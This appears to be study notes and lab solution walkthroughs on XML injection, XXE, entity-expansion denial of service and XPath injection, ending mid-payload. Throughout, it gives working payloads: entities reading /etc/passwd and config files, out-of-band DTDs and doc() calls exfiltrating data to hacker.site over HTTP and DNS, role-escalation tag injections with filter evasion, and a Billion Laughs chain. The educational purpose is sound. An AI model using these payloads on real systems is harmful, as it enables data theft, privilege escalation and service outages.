XML is taken using a querying mechanism   Tag/Fragment Injection  In this scenario, thea attacker is able to alter the XML document structure by injecting both XML data and XML tags.     Lets assume a web app is using XML to store users and passwords   If the user is able to inject some XML metacharacters within the document. The, if they app fails to contextually validate data, its vulnerable to XML Injection:  Metacharacters: ' \" &lt; &gt; &amp;    '   How to test:  - We have to inject metacharacters, attempting to break some of the structures   Texting XML Injection   Single/Double Quotes  Single and Double quotes are used to define an attribute value in the tag:  &lt;group id=\"id\"&gt;admin&lt;/group&gt;  &lt;group id='id'&gt;admin&lt;/group&gt;   An ID like the following, will make the XML incorrect:  &lt;group id=\"12\"\"&gt;admin&lt;/group&gt;  &lt;group id='12''&gt;admin&lt;/group&gt;      \" # duplicating the Quotes  Ampersand &amp;  Its used to represent entities:  &amp;EntityName;      By injecting &amp;name;,  we can trigger an error if the entity is not defined. Additionaly, we can attempt to remove the final ;, generating a malformed XML structure.   Angular Parentheses  &lt; &gt;   Using angular parentheses, we can begin to define several areas within the XML document such as tag names, comments, and CDATA sections:  &lt;tagname&gt; &lt;!-- --&gt; &lt;![CDATA[value]]&gt;   XSS with CDATA  We can also try exploiting the XML parser, thereby introducing both a possible XSS attack vector and possibly bypassing a weak filter.  &lt;script&gt;&lt;![CDATA[alert]]&gt;('XSS')&lt;/script&gt;   During XML processing, the CDATA section is eliminated, generating the infamous XSS payload  &lt;script&gt;alert('XSS')&lt;/script&gt;   Its possible to escape angular parentheses:  &lt;![CDATA[&lt;]]&gt;script&lt;![CDATA[&gt;]]&gt;alert('XSS')&lt;![CDATA[&lt;]]&gt;/script&lt;![CDATA[&gt;]]&gt;   Equals:  &lt;script&gt;alert('XSS')&lt;/script&gt;   XML External Entity  Consist of injecting external entities into the document definition; This type of attack is known as XXE (XML eXternal Entities)      In general, the idea is to tell XML parsers to load externally defined entities, therefore making it possible to access sensitive content stored on the vulnerable host.   Taxonomy  Two types:  - Private  - Public      Private external entities   Are restricted to either a single author or group of authors   Public:   Was designed For a broader usage:  &lt;!ENTITY name SYSTEM \"URI\"&gt; //private &lt;!ENTITY name PUBLIC \"PublicID\" \"URI\"&gt; //public      Important to note that the URI field does not limit XML parses from resolving HTTPs protocols only   There are a number of valid URI schemes allowed (FILE, FTP, DNS, PHP, etc)   → http://en.wikipedia.org/wiki/URI_scheme   With external entities, we can create dynamic references in the document      The most dangerous are the private ones, because they allow us to disclose local system files, play with network schemes, manipulate internal applications, etc.   Resource Inclusion  The attacker uploads/crafts a malicious XML file   This includes an external entity definition that points to a local file:  &lt;!ENTITY xxefile SYSTEM \"file:///etc/passwd\"&gt;   Then in the body of the XML request, they add the reference to the created entity:  &lt;body&gt;&amp;xxefile;&lt;/body&gt;               Once the receiver reads the message, he will not only see the body of the message, but also the content of the external entity &amp;xxefile;(/etc/passwd file)   Resource Inclusion - Improved  &amp; &lt; &gt; are special characters and will cause errors      lets see more examples   We want to access a php config file:  &lt;?php &amp;config=array(); &amp;config['username'] = 'hiddenuser'; &amp;config['password'] = 'mysuperpassword';   In case we try to use the classic technique to extract the resource via XXE,  it will fail because is has special characters such as &gt; and &amp;      even with [CDATA] bypass it will fail   Parameters Entities   → https://www.w3.org/TR/xml/#dt-PE   &lt;!ENTITY % name \"value\"&gt; &lt;!ENTITY % name SYSTEM \"URI\"&gt; &lt;!ENTITY % name PUBLIC \"PublicID\" \"URI\"&gt;   CDATA Escape Using Parameter Entities  By both using the CDATA bypass and Parameter Entities its possible to retrieve the resource content      It works in major XML parsers   But in PHP there is an alternative: Built-in Wrapper   → http://php.net/manual/en/wrappers.php.php   php://I/O streams  → php://filter   This is a kind of meta-wrapper designed to convert the application filters to a stream at the time of opening   → http://php.net/manual/en/filters.php      In order to avoid XML parsing errors, we need a filter that reads the target file and then converts the content into a format that is harmless to the XML structure       Base64:  php://filter/read=conver.base64-encode/resource=/path/to/config.php   Bypassing Access Controls  Lets improve the previous PHP config file by adding an access restriction to a local server IP addresses      If we attempt to access it from the web, an ACCESS DENIED page will be displayed      However, if the frontend is vulnerable to XXE, we can exploit the flaw and steal the page content.   Out-of-Band Data Retrieval  This OOB technique we can use when we cant to extract file contents without any direct output.         To assist in the exploitation of this technique:  https://github.com/joernchen/xxeserve   Its an app that runs a server which is useful in collecting data sent out of band   *example using XXEServe in images   Note from Video   1  &lt;!DOCTYPE test [ &lt;!ENTITY fakeEntity SYSTEM \"file:///etc/passwd\"&gt; ]&gt; ... &amp;fakeEntity   2  &lt;!DOCTYPE test [ &lt;!ENTITY fakeEntity SYSTEM \"http://hacker.site:1337/XXE_OOB_TEST\"&gt; ]&gt;  ... &amp;fakeEntity   in kali:  netcat -lvnp 1337 -k -w 1   Grab the xxeserver from github   Add these lines:  set :bind, \"xxe.hacker.site\" set :port, 80   evil DTD  &lt;!ENTITY % resource SYSTEM \"php://filter/read=conver.base64-encode/resource=file:///etc/fstab\"&gt; &lt;!ENTITY % LoadOOBEnt \"&lt;!ENTITY &amp;#x25; OOB SYSTEM 'http://xxe.hacker.site/?p=%resource;'&gt; \"&gt;   evil XML  &lt;!DOCTYPE XXE_OOB [   &lt;!ENTITY % EvilDTD SYSTEM \"http://hacker.site/evil.dtd\"&gt;   %EvilDTD;    %LoadOOBEnt; // the entity that defines a new entity   %OOB; // entity that performs the OOB communication ]&gt;      dont forget to open the xxeserver  The space must be changed to + sign before it can be base64 decoded    cat &lt;file&gt; | tr ' ' '+' | base64 -d   XML Entity Expansion (XEE)  Its a Denial of Service Attack   Recursive Entity Expansion  The most well-known XEE attack: Billion Laughs      The attack exploits XML parsers into exponentially resolving sets of small entities.      This is done in order to explode the data from a simple lol string to a billion lol strings    Billion Laughs Attack      This attack can grow to approximately 3GB of memory      Thats quite a large amount of memory utilization and obviously quite devastating    Generic Entity Expansion  Another DoS attack is the Quadratic Blowup Attack         We can obfuscate this malicious attack by moving the entities definition from the local DTD to an external one.    Obfuscating:      XPath Injection  Must be known before playing with other parallel languages, such as:  - XQuery - XSLT - Xlink - XPointer      XPath is regarded as the SQL For querying XML databases    XPath Recap  XPath allows us to navigate around the XML tree structure so that we can retrieve a list of nodes, an atomic value, or any sequence allowed by the data model that respects the searching criteria.   New Operations and Expressions on Sequences  The most signigicant keyword: SEQUENCE   → http://www.w3.org/TR/xpath-functions/   Sequence is an ordered collection of zero or more items. An item is either a node or an atomic value. A node is an instance of one of the node kinds defined in Data Model.      Every XPath expression returns a sequence. This is an ordered grouping of atomic values or nodes with duplicates permitted.   Function on Strings  upper-case and lower-case are useful during detection phase, especially if we dont know the XPath version used.     If we are able to produce a positive output, then the function exists, therefore making it version 2.0   If a negative output is produced, then its version 1.0  /Employees/Employee[username=\"$_GET['c']\"]   base-uri is useful in detecting properties about URIs. Calling this function without passing any argument allows us to potentially obtain the full URI path of the current file:  base-uri() # file://path/to/XMLfile.xml   FOR Operator  It enables iteration (looping) over sequences, therefore returning a new value For each repetition. The following XPath expression retrieves the list of usernames:  for $x in /Employees/Employee return $x/username   Conditional Expression     if   if ($employee/role = 2)   then $employee   else 0   Regular Expression  Another useful improvement involves the ability to use Regular Expression syntax For pattern matching using the keywords matches, replace, or tokenize.      These functions used in conjunction with conditional operators and other quantifiers are great toolkits For attackers.   Assemble/Disassemble Strings  codepoints-to-string and string-to-codepoints.      They allow us to convert a string into a sequence of integer and respectively, from a sequence of integer returns a string:       Data Types  The first version of XPath supported four data types:  - Number (floating-point) - String - Boolean - Node-Set   v2.0 introduced support For all simple primite types built into the XML schema in addition to 19 simple types, such as dates, URIs, etc      Resource For Xpath:  https://www.w3schools.com/xml/xpath_syntax.asp   Advanced XPath Exploitation   Blind Exploitation   Error Based:      Like exploiting SQL injection, the error based extraction technique is suitable if, with an XPath query, we can generate a runtime error and this error is detectable is some way.   We want to configure our tests so that we trigger an error every time a specific condition is met.   error() raises an error and never returns a value which is exactly what we need FOr our tests   For example:  ... and (if ( $employee/role = 2) then error() else 0 ) ...      The error can be shown in a div, as a 500 page, a custom HTTP status code, and / or many other methods    Boolean Based:   By leveraging various inference techniques, we have to extract information based on a set of focused deductions      The most used are: boolean-based and time-based techniques, however in XPath there are no features that allow us to handle delays, therefore we can only use the Boolean attacks.   For example: String Functions that use Pattern Matching are useful in reducing the character search space   → http://www.w3.org/TR/xpath-functions/#string.match   While the Functions on String Values, such as normalize-unicode, etc. Are useful in handling all the possible encoding (impossible without these functions).   → http://www.w3.org/TR/xpath-functions/#string-value-functions   OOB Exploitation  in Xpath 2.0 = http://www.w3.org/TR/xpath-functions/#func-doc   doc($uri)      If we are able to include a file, remotely or locally, in our target application, then we can do a lot of bad things and, of course, in this case , we can.   With the doc function, we can read any local XML file:  (substring((doc('file://protected/secret.xml')/*[1]/*[1]/text()[1]),3,1))) &lt; 127   HTTP Channel  We can trick the victim site into sending what we cant read to our controlled web server.   Example using the doc():  doc(concat(\"http://hacker.site/oob/\", RESULTS_WE_WANT)) doc(concat(\"http://hacker.site/oob/\", /Employees/Employee[1]/username))   The URI has its rules and we need to encode out strings in order to make the format suitable For sending from the victim site to the attack site.   encode-for-uri function:  doc(concat(\"http://hacker.site/oob/\", encode-for-uri(/Employees/Employee[1]/username)))   Setting up a listening HTTP server is quite simple; however, if we are lazy, then we can use use ‘xxeserve’ or ‘xcat’   → xxeserve = https://github.com/joernchen/xxeserve   → xcat     = http://xcat.readthedocs.org/   XCat is a command line tool that aides in the exploitation of Blind XPath injection flaws. Some features:  - Advanced data postback through HTTP - Arbitrarily read XML/text files on the web server via the **doc() function** and crafted SYSTEM entities (XXE)   DNS Channel  Often the HTTP channel is blocked by firewall or other filters      Usually even when we cant exfiltrate via HTTP, outgoing DNS queries are permitted access to arbitrary hosts.   So, instead of sending data as GET parameters, we use a controlled name server and force the victim site to resolve our domain with they juicy data as subdomain values, like:   → http://username.password.hacker.site      The length of any one label is limited to between 1 and 63 octets and globally, a full domain name, is limited to 255 octets(including the separators)      Since DNS primarily uses UDP, its not guaranteed that requests arrive at the attackers server. Think about network congestion or all the other possibilities that might cause data to get lost.    Note from Video  ... and count(/*[1]/*)=1 # find the tree of the XML file  ... and substring(name(/*[1],1,1)='a' # guess the names  in 2.0 we can use: ... and string-to-codepoints(/*[1],1,1) &gt; 100  # in this case codepoints.net can help us translate the values to strings   to exfiltrate via HTTP  Setup a web server in apache2  ... and doc('http://hacker.site/OOB/test/request')  ... and doc(concat('http://hacker.site', 'value1/', 'value2'))  ... and doc(concat('http://hacker.site', name(/*))) # to discover the root name xml file  ... and doc(concat('http://hacker.site', name(/*[1]/*[1]))) # u can discover the full tree name  ... and doc-available(concat('http://hacker.site', encode-for-uri(name(/*[1]/*[1]))))    to exfiltrate via DNS  apt-get install maradns   Basically we will configure a functioning DNS like *.hacker.site      all subdomains will redirect to hacker.site   Then we can exfiltrate the values of XML files in the subdomain spaces:  and doc-available(concat('http://', name(/*),'.', '.__.hacker.site')      Dont forget the tail -f in the maradns log file to get the results       if we need to test space or others characters that are not allowed   we need to get the value in codepoints.net and encode like  curl hello\\32world.hacker.site   Using automated Tool  Xcat:  python run_xcat.py --method GET http://xpath.hacker.site title=Code title \"Brown\" test_injection python run_xcat.py --method GET http://xpath.hacker.site title=Code title \"Brown\" run python run_xcat.py --method GET http://xpath.hacker.site title=Code title \"Brown\" run retrieve //this will retrieve the whole file python run_xcat.py --public-ip \"127.3.4.5\" --method GET http://xpath.hacker.site title=Code title \"Brown\" run retrieve python run_xcat.py --method GET http://xpath.hacker.site title=Code title \"Brown\" run file_shell   Lab 1   Solutions - Lab #1   Simple XML TAG injection exploitation warm-up: D0 u w@nn@ b3 a l33t m3mb3r?   Background   There are two types of users: leet and looser. By default, every new user is a looser. Find a way to become a leet member. Exploitation steps   A valid XML structure is reported in the core.js file within the function WSregister__old.   As you can see in the previous implementation, the developers used a different approach that helps us to detect the XML structure in this scenario.  function WSregister__old() { ...   var xml = '&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; ';   xml += '&lt;user&gt;                                    ';   xml += '    &lt;role&gt;2&lt;/role&gt;                        ';   xml += '    &lt;name&gt;' + name + '&lt;/name&gt;             ';   xml += '    &lt;username&gt;' + username + '&lt;/username&gt; ';   xml += '    &lt;password&gt;' + password + '&lt;/password&gt; ';   xml += '&lt;/user&gt;                                   '; ... }   Testing parameter name Registering:      If we register a user, we can see that its name is echoed back in the welcome message and is encoded with htmlspecialchars.   Furthermore, if we try to inject some tags (e.g., ), the application works and registers the new user. Therefore, this parameter is not injectable.   Testing parameter password:      If we adopt the same approach with the password, we can see that even the password is not injectable!   Testing parameter username:      The only injectable parameter is the username.   If we take advantage of the XML structure found in the core.js file we could easily inject our leet user as follows:  name:     useless username: useless&lt;/username&gt;&lt;/user&gt;&lt;user&gt;&lt;rule&gt;1&lt;/rule&gt;&lt;name&gt;l33t&lt;/name&gt;&lt;username&gt;l33t password: l33t  The leet login will be:  username: l33t password: l33t   Solutions - Lab #2   Simple XML TAG injection exploitation with length limitation: Does Length Matter?   Background   There are two types of users: leet and looser. By default, every new user is a looser. Find a way to become a leet member. Exploitation steps   A valid XML structure is reported in the core.js file within the function WSregister__old.   As you can see in the previous implementation, the developers used a different approach than in this scenario, which helps us detect the XML structure:  function WSregister__old() {    ...   var xml = '&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; ';   xml += '&lt;user&gt;                                    ';    xml += '    &lt;role&gt;2&lt;/role&gt;                        ';    xml += '    &lt;name&gt;' + name + '&lt;/name&gt;             ';    xml += '    &lt;username&gt;' + username + '&lt;/username&gt; ';    xml += '    &lt;password&gt;' + password + '&lt;/password&gt; ';    xml += '&lt;/user&gt;                                   ';    ...  }   Testing parameter name:      Registering a test user, we can see that the name of the new user is echoed back in the welcome message and is encoded with htmlspecialchars.   If we try to inject some tags (e.g., ), the application returns an error message:      Opening and ending tag mismatch …   Testing parameter username:      If we adopt the same approach as before, we can see that even the username is injectable!   Testing parameter password:      If we adopt the same approach as before, we can see that the password is not injectable!   Length limitations:      We notice that the name and username have length limitations of 35 characters.      In fact, if we try to inject something longer, the application cuts/truncates our input.    Since we have two injection points, to bypass this limitation we can split and inject our payload in the two places:  name:     &lt;/name&gt;&lt;/user&gt;&lt;user&gt;&lt;rule&gt;1&lt;!-- username: -- &gt;&lt;/rule&gt;&lt;name&gt;x&lt;/name&gt;&lt;username&gt;x password: l33t  The leet login will be:  username: x password: l33t   Solutions - Lab #3   XML TAG injection exploitation with length limitation and filters: If youre tired .. have a break!   Background   There are two types of users: leet and looser. By default, every new user is a looser. Find a way to become a leet member. Exploitation steps   A valid XML structure is reported in the core.js file within the function WSregister__old.   As you can see in the previous implementation, the developers used a different approach than in this scenario, which helps us detect the XML structure.  function WSregister__old() {   ...   var xml = '&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; ';    xml += '&lt;user&gt;                                    ';    xml += '    &lt;role&gt;2&lt;/role&gt;                        ';    xml += '    &lt;name&gt;' + name + '&lt;/name&gt;             ';    xml += '    &lt;username&gt;' + username + '&lt;/username&gt; ';    xml += '    &lt;password&gt;' + password + '&lt;/password&gt; ';    xml += '&lt;/user&gt;                                   ';    ... }   Testing parameter name:      Registering a test user, we can see that the name of the new user is echoed back in the welcome message and is encoded with htmlspecialchars. But, if we try to inject some tags (e.g., ),   The application returns an error message like the following:      Opening and ending tag mismatch …   Testing parameter name:      If we adopt the same approach as before, we can see that even the username is injectable!   Testing parameter password:      If we adopt the same approach as before, we can see that the password is not injectable!   Length limitations:      We notice that name and username have length limitations of 34 characters.      In fact, if we try to inject something longer, the application cuts/truncates our input.    Since we have two injection points, to bypass this limitation we can split and inject our payload in the two places:  name:     &lt;/name&gt;&lt;/user&gt;&lt;user&gt;&lt;rule&gt;1&lt;!-- username: --&gt;&lt;/rule&gt;&lt;name&gt;&lt;/name&gt;&lt;username&gt;x password: l33t   Bypassing Filters:      Bypassing length limitations is not enough. The application implements some filters against the XML TAG injection that blocks the previous payload.   In this case, if the filter detects some dangerous elements, it shows a message like the following:  So you wanna be a l33t member so easily?! ಠ_ಠ  # Injecting some metacharacters, we can see that &amp;, \\ , , , \"\" , '' are filtered but &lt; and &gt; are not!   There is another filter that blocks the and tags.   The check is case-insensitive, and it seems that spaces and tabs are ignored between the tag name and the close tag character, but if we inject a new line, it is not filtered!   So the exploitation could be the following:  name:     &lt;/name&gt;&lt;/user&gt;&lt;user&gt;&lt;rule{NEW_LINE}&gt;1&lt;!-- username: --&gt;&lt;/rule{NEW_LINE}&gt;&lt;name&gt;&lt;/name&gt;&lt;username&gt;x password: l33t   Now the username has a length of 35; injecting this payload, we would have an empty username and thus an invalid login.      We need to remove something from the payload, and the tag seems to be ignored server-side.   The working exploit is:  name:     &lt;/name&gt;&lt;/user&gt;&lt;user&gt;&lt;rule{NEW_LINE}&gt;1&lt;!-- username: --&gt;&lt;/rule{NEW_LINE}&gt;&lt;username&gt;l33t password: l33t   Inside burp the request should look as follows:  POST /add_new.php HTTP/1.1 ... name=&lt;/name&gt;&lt;/user&gt;&lt;user&gt;&lt;rule &gt;1&lt;!--&amp;user=--&gt;&lt;/rule &gt;&lt;username&gt;l33t&amp;password=l33t  The leet login will be:  username: l33t password: l33t    Lab 2   Below, you can find solutions for each task. Remember, though, that you can follow your own strategy, which may be different from the one explained in the following lab.      NOTE: The techniques to use during this lab are better explained in the study material. You should refer to it for further details. These solutions are provided here only to verify the correctness.    Solutions - Lab #1   Basic XXE exploitation: requires a file for the solution:   Simple warm-up Exploitation steps:  Download the content of .letmepass (exploit.sh can be found at http://1.xxe.labs/solution/exploit.sh)  ./exploit.sh {DOCROOT}/.letmepass   Extract the content from the result:  [Step 1] | awk 'match($0, /&lt;b&gt;XXEME (.*)&lt;\\\\\\/b&gt;/, m) { print m[1] }'  OR  [Step 1] | gawk 'match($0, /&lt;b&gt;XXEME (.*)&lt;\\\\\\/b&gt;/, m) { print m[1] }'   Remove JSON escaping characters:  [Steps 1|2] | sed 's/\\\\\\//\\//g'   Testing command:   Note: this is GNU-based awk command:  ./exploit.sh /var/www/1/.letmepass \\ | awk 'match($0, /&lt;b&gt;XXEME (.*)&lt;\\\\\\/b&gt;/, m) { print m[1] }' \\ | sed 's/\\\\\\//\\//g'   Solutions - Lab #2   Basic XXE exploitation and basic curl with base64 encoded solution:   Simple (encoded) warm-up   Valid passphrase   The hidden username is theOhpe that base64-encoded is: dGhlT2hwZQ==.   To retrieve the value, it is required to perform a DELETE request to the whois.php script. Exploitation steps   Download the content of .letmepass:  ./exploit.sh {DOCROOT}/.letmepass   Extract the content from the result:  [Step 1] | gawk 'match($0, /&lt;b&gt;XXEME (.*)&lt;\\\\\\/b&gt;/, m) { print m[1] }'   Remove JSON escaping characters:  [Steps 1|2] | sed 's/\\\\\\//\\//g'   Retrieve the content of whois.php using the DELETE verb:  curl -s \"http://2.xxe.labs/whois.php\" -X DELETE      Base64 decode and store the result in a file.      The base64 command has different implementations; therefore, you may need one of these two switches to decode:    [Steps 1|2|3] | base64 -d  OR  [Steps 1|2|3] | base64 -D   Testing command:  ./exploit.sh php://filter/convert.base64-encode/resource=/var/www/xxe/2/.letmepass \\ | awk 'match($0, /&lt;b&gt;XXEME (.*)&lt;\\\\\\/b&gt;/, m) { print m[1] }' \\ | sed 's/\\\\\\//\\//g'  curl -s 'http://2.xxe.labs/whois.php' -X DELETE | base64 -d   Solutions - Lab #3   The solution is encoded and obfuscated in a php file   Dont break my XML:   Exploitation steps   Download base64 encoded the content of .letmepass:  ./exploit.sh php://filter/convert.base64-encode/resource=/var/www/3/.letmepass.php   Extract the content from the result:  [Step 1] | gawk 'match($0, /&lt;b&gt;XXEME (.*)&lt;\\\\\\/b&gt;/, m) { print m[1] }'   Remove JSON escaping characters:  [Steps 1|2] | sed 's/\\\\\\//\\//g'   Base64 decode and store result within a file:  [Steps 1|2|3] | base64 -d &gt; whaat.php  OR  [Steps 1|2|3] | base64 -D &gt; whaat.php   De-obfuscate the $config variable and execute the php script:  echo 'var_dump($config);' &gt;&gt; whaat.php | php whaat.php   Testing command:  ./exploit.sh php://filter/convert.base64-encode/resource=/var/www /3/.letmepass \\ | awk 'match($0, /&lt;b&gt;XXEME (.*)&lt;\\\\\\/b&gt;/, m) { print m[1] }' \\ | sed 's/\\\\\\//\\//g' \\ | base64 -d &gt; whaat.php  echo 'var_dump($config);' &gt;&gt; whaat.php | php whaat.php   Solutions - Lab #4   A png file contains the solution:   Do you like ASCII? I do! Exploitation steps   Download the base64 encoded the content of .letmepass:  ./exploit.sh php://filter/convert.base64-encode/resource=/var/www/4/.letmepass.php   Extract the content from the result:  [Step 1] | gawk 'match($0, /&lt;b&gt;XXEME (.*)&lt;\\\\\\/b&gt;/, m) { print m[1] }'   Remove the JSON escaping characters:  [Steps 1|2] | sed 's/\\\\\\//\\//g'   Base64 decode and store result within a file:  [Steps 1|2|3] | base64 -d &gt; wohoo.png  OR  [Steps 1|2|3] | base64 -D &gt; wohoo.png      Open the file   Testing command:  ./exploit.sh php://filter/convert.base64-encode/resource=/var/www/4/.letmepass \\ | awk 'match($0, /&lt;b&gt;XXEME (.*)&lt;\\\\\\/b&gt;/, m) { print m[1] }' \\ | sed 's/\\\\\\//\\//g' \\ | base64 -d &gt; wohoo.png  open wohoo.png   Solutions - Lab #5   In a folder full of files, there is a special one…:   Wheres the hidden file?   Exploitation steps   The solution within basexml.php.  Part 1  - Download the base64 encoded the content of .letmepass. - Extract the content from the result. - Remove the JSON escaping characters. - Base64 decode and store result within a file.   Part 2  - Download a list of common PHP file names; this is a good resource: Filenames_PHP_Common.wordlist @ (http://blog.thireus.com/web-common-directories-and-filenames-word-lists-collection) - Automate the retrieving process: - Similar to Part 1 - Parse result and show the good file that contains the tag .   Testing command:   Part 1   Extract instructions from .letmepass:  ./exploit.sh /var/www/5/.letmepass   Part 2  ./file_extractor.sh /var/www/5/hidden/   Solutions - Lab #6   Blind XXE here. IT requires some OOB exploitations:   Get out of here!! Exploitation steps   The solution is within .letmepass.php; this is a blind XXE exploitation, so you need to set up an OOB channel.   Here are the steps:   Craft the XML payload moving the external entity definitions in another DTD file (evil_oob.dtd)  &lt;?xml version='1.0'?&gt; &lt;!DOCTYPE xxe [     &lt;!ENTITY % EvilDTD SYSTEM 'http://hacker.site/evil_oob.dtd'&gt;     %EvilDTD;     %LoadOOBEnt;     %OOB; ]&gt; &lt;login&gt;     &lt;username&gt;XXEME&lt;/username&gt;     &lt;password&gt;password&lt;/password&gt; &lt;/login&gt;   Create evil_oob.dtd as follows:  &lt;!ENTITY % resource SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///var/www/6/.letmepass.php\"&gt; &lt;!ENTITY % LoadOOBEnt \"&lt;!ENTITY &amp;#x25; OOB SYSTEM 'http://hacker.site:2108/?p=%resource;'&gt;\"&gt;      [Note] http://hacker.site:2108/xml?p=%resource is the path where the xxeserve shell is listening; you can change it with what you want.       Run the xxeserve script   ruby xxeserve.rb      [Note] You can improve xxeserve by adding the following lines. With this way, you can customize the port and host to use:    set :bind, 'hacker.site' set :port, 2108   Base64 Decode   Decode what the shell has received! Check the files folder  cat files/{IP.TIME} | base64 -d   Solutions - Lab #7   In a folder full of files, there is a special one… the flaw is blind:   Get out of here, but wait… wheres the hidden file?!   Exploitation steps   The solution is in Background.php; this is a blind XXE exploitation, so you need to set up an OOB channel.   Here are the steps:  - Retrieve the .letmepass file for instructions - Automate the retrieving process   a. Retrieve the .letmepass file for instructions   Craft the XML payload moving the external entity definitions in another DTD file (evil_oob.dtd)   File: exploit.sh  &lt;?xml version='1.0'?&gt;  &lt;!DOCTYPE xxe [     &lt;!ENTITY % EvilDTD SYSTEM 'http://hacker.site/evil_oob.dtd'&gt;     %EvilDTD;     %LoadOOBEnt;     %OOB; ]&gt; &lt;login&gt;      &lt;username&gt;XXEME&lt;/username&gt;      &lt;password&gt;password&lt;/password&gt;  &lt;/login&gt;   File: evil_oob.dtd  &lt;!ENTITY % resource SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///var/www/7/.letmepass.php\"&gt;  &lt;!ENTITY % LoadOOBEnt \"&lt;!ENTITY &amp;#x25; OOB SYSTEM 'http://hacker.site:2108/?p=%resource;'&gt;\"&gt;      [NOTE] http://hacker.site:2108/xml?p=%resource is the path where &gt; the xxeserve shell is listening; you can change it with what you want.       Run the xxeserve script     ruby xxeserve.rb           [NOTE] I added the following lines in order to customize port and host   set :bind, 'hacker.site' set :port, 2108   Decode the .letmepass  file   Decode what the shell has received! Check the files folder  cat files/{IP.TIME} | base64 -d      Clear all in files folder   b. Automate the retrieving folder      Download a list of common PHP file names.   This is good: Filenames_PHP_Common.wordlist   Make the file extractor script:  See file_extractor.sh      [Note] there are some hardcoded paths within the script, you should adapt them respect to your configuration.    Make a proxy script:  See getOOB.php      This script is useful, as it can echo custom XML payloads by just passing to it a GET request to resource to extract.    Lab 3   Below, you can find solutions for each task. Remember, though, that you can follow your own strategy, which may be different from the one explained in the following lab.      [NOTE] The techniques to use during this lab are better explained in the study material. You should refer to it for further details. These solutions are provided here only to verify the correctness.    Solutions - Lab #1   Simple XEE exploitation warm-up:   You make me laugh so much! Valid Passphrase   The valid passphrase is We_don’t_like_DoS_attacks Exploitation Steps      Testing the login form, you’ll receive a hint that tells you to visit the stats path.   Open the stats path and check the Physical Memory percentage status.   Run the Billion laughs attack against the login parser. If the attack works properly, you’ll notice an alert box with the secret passphrase.   Solutions - Lab #2  Simple XEE exploitation mixed with a simple XXE exploitation:   We don’t forget how to exploit XXE Valid Passphrase   The valid passphrase is The_second_level_is_done!..like_a_boss Exploitation Steps      Testing the login form, you’ll receive a hint that tells you to visit the stats path.   Open the stats path and check the Physical Memory percentage status.   Run the Billion laughs attack against the login parser. If the attack works properly, you’ll notice an alert box with the instructions.   Run an XXE attack to read the log file and clear some useless text   Extract the content from the result. Use awk or gawk, depends on the system:  gawk 'match($0, /&lt;b&gt;XXEME (.*)&lt;\\\\\\/b&gt;\\s/, m) { print m[1] }'   Remove the JSON escaping characters  sed 's/\\\\\\//\\//g'   XEE DoS  ./exploit.sh   XXE log file extraction  ./exploit_xxe.sh /var/www/XEE/2/LOGS/omg_a_dos.log \\ | gawk 'match($0, /&lt;b&gt;XXEME (.*)&lt;\\\\\\/b&gt;\\s/, m) { print m[1] }' \\ | sed 's/\\\\\\//\\//g'./exploit.sh   Solutions - Lab#3   Simple XEE+XEE exploitation enriched with a little bit of encoding:   We don’t forget how encoding works Valid Passphrase   The valid passphrase is The_second_level_is_done!..like_a_boss Exploitation Steps      Testing the login form, you’ll receive a hint that tells you to visit the stats path.   Open the stats path and check the Physical Memory percentage status.   Run the Billion laughs attack against the login parser. If the attack works properly, you’ll notice an alert box with the instructions.   Run an XXE attack to read the log file and clear some useless text   Encode the log path  %5BLOGS%5D/omg_%C3%A0_dos.log   Extract the content from the result. Use awk or gawk, depends on the system:  gawk 'match($0, /&lt;b&gt;XXEME (.*)&lt;\\\\\\/b&gt;\\s/, m) { print m[1] }'   Remove JSON escaping characters:  sed 's/\\\\\\//\\//g'   Decode Unicode characters:  echo $(php -r \"echo html_entity_decode(preg_replace(\\\"/%u([0-9a-f]{3,4})/i\\\",'&amp;#x\\\\1;',str_replace('\\u', '%u', '$cleaned')),null,'UTF-8');\" ;   XEE DoS  ./exploit.sh   XXE log file extraction  ./exploit_xxe.sh /var/www/3/%5BLOGS%5D/omg_%C3%A0_dos.log   Solutions - Lab#4   XEE+XXE exploitations mixed with filter evasion and character encodings:   Ah filters … always throw a spanner in the works. Valid Passphrase   The valid passphrase is Escaping_and_evasion_like_a_boss Exploitation Steps           Testing the login form, youll receive a hint that tells you to visit the stats path.            Open the stats path and check the Physical Memory percentage status.            Run the Billion laughs attack against the login parser. If the attack works properly, youll notice an alert box with the instructions.          [NOTE] The server implements some filers to avoid XEE attacks. To exploit the flaw, the fastest solution is to move the Billion laughs attack in an external DTD file hosted on hacker.site (replace it with the IP address of your attacker machine), and then call it as follows:    xml payload  &lt;?xml version=\"1.0\"?&gt; &lt;!DOCTYPE results [     &lt;!ENTITY % EvilDTD PUBLIC \"xxe\"         \"http://hacker.site/evil_remote_xee.dtd\"&gt;     %EvilDTD; ]&gt; &lt;login&gt;     &lt;username&gt;XEEME &amp;file;&lt;/username&gt;     &lt;password&gt;password&lt;/password&gt; &lt;/login&gt;      [Note] make sure to replace hacker.site with the IP address of your attacker machine.    file: evil_remote_xee.dtd  &lt;!ENTITY lol \"lol\"&gt; &lt;!ENTITY lol1 \"&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;\"&gt; &lt;!ENTITY lol2 \"&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;\"&gt; &lt;!ENTITY lol3 \"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;\"&gt; &lt;!ENTITY lol4 \"&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;\"&gt; &lt;!ENTITY lol5 \"&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;\"&gt; &lt;!ENTITY lol6 \"&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;\"&gt; &lt;!ENTITY lol7 